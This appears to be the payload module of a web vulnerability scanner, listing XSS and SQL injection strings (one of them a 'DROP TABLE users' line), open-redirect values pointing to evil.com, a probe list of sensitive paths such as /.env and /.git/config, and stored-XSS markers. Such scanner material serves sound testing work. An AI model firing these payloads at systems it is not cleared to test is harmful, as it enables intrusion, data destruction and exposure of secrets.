"""
Centralized payload library for V2 scanner.
All attack vectors, wordlists, and test strings live here.
"""

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert('XSS')>",
    '"><img src=x onerror=prompt(1)>',
    "<iframe src=javascript:alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
]

SQL_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "' UNION SELECT NULL --",
    "'; DROP TABLE users; --",
    "1 AND 1=1",
    "1 AND 1=2",
    "' OR 'x'='x",
    "\" OR \"x\"=\"x",
    "1; SELECT * FROM information_schema.tables",
    "' AND SLEEP(5) --",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "https://evil.com/path",
    "http://evil.com",
    "%2F%2Fevil.com",
    "https%3A%2F%2Fevil.com",
]

SENSITIVE_DIRECTORIES = [
    "/admin", "/admin/", "/login", "/wp-admin", "/wp-admin/",
    "/administrator", "/phpmyadmin", "/phpmyadmin/",
    "/.git", "/.git/config", "/.env", "/config",
    "/backup", "/backup.zip", "/backup.tar.gz",
    "/db.sql", "/database.sql",
    "/api", "/api/v1", "/api/v2",
    "/swagger", "/swagger-ui.html",
    "/robots.txt", "/sitemap.xml",
    "/.htaccess", "/web.config",
    "/server-status", "/server-info",
    "/phpinfo.php", "/test.php", "/info.php",
    "/console", "/dashboard", "/upload", "/uploads",
    "/files", "/private", "/secret", "/hidden",
    "/old", "/temp", "/tmp",
]

SECURITY_HEADERS = {
    "X-Frame-Options": {
        "description": "Prevents clickjacking via frame embedding control",
        "recommended": "DENY or SAMEORIGIN",
    },
    "X-Content-Type-Options": {
        "description": "Prevents MIME type sniffing",
        "recommended": "nosniff",
    },
    "X-XSS-Protection": {
        "description": "Enables browser-level XSS filtering",
        "recommended": "1; mode=block",
    },
    "Content-Security-Policy": {
        "description": "Restricts content sources to prevent XSS",
        "recommended": "default-src 'self'",
    },
    "Strict-Transport-Security": {
        "description": "Forces HTTPS connections",
        "recommended": "max-age=31536000; includeSubDomains",
    },
    "Referrer-Policy": {
        "description": "Controls referrer information on requests",
        "recommended": "strict-origin-when-cross-origin",
    },
    "Permissions-Policy": {
        "description": "Restricts browser API access",
        "recommended": "geolocation=(), microphone=(), camera=()",
    },
    "Cache-Control": {
        "description": "Controls caching behavior for sensitive pages",
        "recommended": "no-store",
    },
}

REDIRECT_PARAMS = [
    "redirect", "redirect_uri", "redirect_url",
    "url", "next", "return", "returnto", "return_to",
    "goto", "go", "continue", "target", "dest",
    "destination", "rurl", "return_url", "callback",
    "forward", "to", "link", "location",
]

IDOR_PARAMS = [
    "id", "user_id", "uid", "account_id", "profile_id",
    "order_id", "invoice_id", "file_id", "doc_id",
    "item_id", "product_id", "post_id", "message_id",
    "customer_id", "record_id", "pid", "rid", "oid",
    "userid", "user", "account", "member_id",
]

# Unique marker injected during stored XSS two-pass detection
STORED_XSS_MARKER = "SVXSS_PROBE_7f3a9"
STORED_XSS_PAYLOADS = [
    f"<script>document.title='{STORED_XSS_MARKER}'</script>",
    f"<img src=x onerror=\"document.title='{STORED_XSS_MARKER}'\">",
    f"'\"><svg onload=\"document.title='{STORED_XSS_MARKER}'\">",
    f"<details open ontoggle=\"document.title='{STORED_XSS_MARKER}'\">",
]
